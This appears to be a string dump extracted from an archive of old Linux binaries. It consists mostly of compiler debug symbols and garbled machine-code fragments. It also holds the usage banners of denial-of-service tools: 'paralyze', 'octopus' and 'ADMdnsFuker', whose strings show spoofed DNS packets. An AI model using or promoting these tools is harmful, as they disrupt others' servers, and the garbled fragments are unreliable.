            "@j\tBP",
            "U\u0409PEP",
            "EEE\u0339EE\u030d",
            ")\u044bE)\u0205u",
            "j\tbP",
            "\u0403;u[]",
            "Error (%s): ",
            "Error (connect): Attempt to connect timed out",
            "paralyze v3 - leet daemon-disabling artillery, by xhostile",
            "----------------------------------------------------------",
            "Usage: %s <host> <port> [-w wait] [-t times]",
            "Error (resolve): %s is not a valid host",
            "w:t:",
            "Host....... %s",
            "Port....... %d",
            "Interval... %d",
            "Interval... fast as possible",
            "Times...... %d",
            "Times...... infinite",
            "Making connections (. = 15)",
            "fork",
            "socket",
            "Descriptor limit (%d) reached",
            "connect",
            "Done (%d connects)",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "paralyze3.c",
            "getpid@@GLIBC_2.0",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "fork@@GLIBC_2.0",
            "signal@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "puts@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "getopt@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "timeout",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "err_hndlr",
            "optarg@@GLIBC_2.0",
            "_IO_stdin_used",
            "kill@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "alarm@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/octopus",
            "0100755",
            "0000000",
            "0000000",
            "00000033423",
            "07100656647",
            "013572",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "getpid",
            "perror",
            "socket",
            "bzero",
            "inet_addr",
            "__deregister_frame_info",
            "signal",
            "read",
            "shutdown",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRhD",
            "PEPh\u020c",
            "\u0403;u[]",
            "Caught sig TERM or INT! Cleaning up.",
            "shutdown",
            "Closing %i",
            "close",
            "Done. Committing suicide. ARRGH!",
            "Usage:\t%s address [port]",
            "\twhere address is a numeric internet address",
            "\tand port is an optional port number (default=25)",
            "socket %i failed",
            "socket",
            "connect %i failed.",
            "connect",
            "pid: %i, desc %i",
            "closing connection.",
            "closed %i",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "octopus.c",
            "getpid@@GLIBC_2.0",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "signal@@GLIBC_2.0",
            "shutdown@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "CatchTERM",
            "__data_start",
            "socket@@GLIBC_2.0",
            "read@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/ADMdnsfuckr",
            "0100755",
            "0000000",
            "0000000",
            "00000045571",
            "07077675744",
            "014262",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "strcpy",
            "printf",
            "random",
            "memcpy",
            "perror",
            "malloc",
            "sleep",
            "recvfrom",
            "socket",
            "bzero",
            "strcat",
            "ntohl",
            "__deregister_frame_info",
            "setsockopt",
            "rand",
            "htonl",
            "sendto",
            "bcopy",
            "memset",
            "ntohs",
            "gethostbyname",
            "sprintf",
            "htons",
            "exit",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "01^PTRh",
            "E1fE",
            "fE1fu",
            "e[^]",
            "fEfU(E\u8345(P",
            "U\u4345(P",
            "1fEP",
            "1fEP",
            "E PE",
            "PEPS",
            "Z E\u8245",
            "_3 \u044b ",
            ") )\u028b",
            "EEfP",
            "P(PE",
            "P $$",
            "[^]U(E",
            "EPUPj",
            "P EU",
            "}fUf",
            "fUm]EmP",
            "]U(E",
            "\u04008.u{PPPPhp",
            "XPHP#",
            "PT*v",
            "PPPPhp",
            "XPHPx",
            ".uTP",
            "1fPx",
            "P uIj",
            "P u#h",
            "PPj5h",
            "PP\" P8",
            "P? uEj",
            "PPj5j5E",
            "PPX Pn",
            "PPP \ub1cd&",
            "XEXP",
            "LPt u",
            "]PUPMPEPh",
            "XPU XPh\u015e",
            "XPEPX",
            "RXPj5|(",
            "RPPTPLP",
            "TTTP",
            "\u0403;u[]",
            "A%c%s",
            "in-addr.arpa",
            "socket",
            "setsockopt",
            " I apres Makepaket == %i ",
            "12.1.1.0",
            "trustip %s,vitcimip %s,spoofna %s,spoofip %s,ID %i,type %i",
            " usage : %s <host> ",
            "0.2 pub",
            "ADMdnsFuker %s  DNS DESTROYER  made by the ADM crew",
            "(c) ADM,Heike vouais tous se ki est as moi est a elle aussi ...",
            "100.1.2.3",
            "in-addr",
            "arpa",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
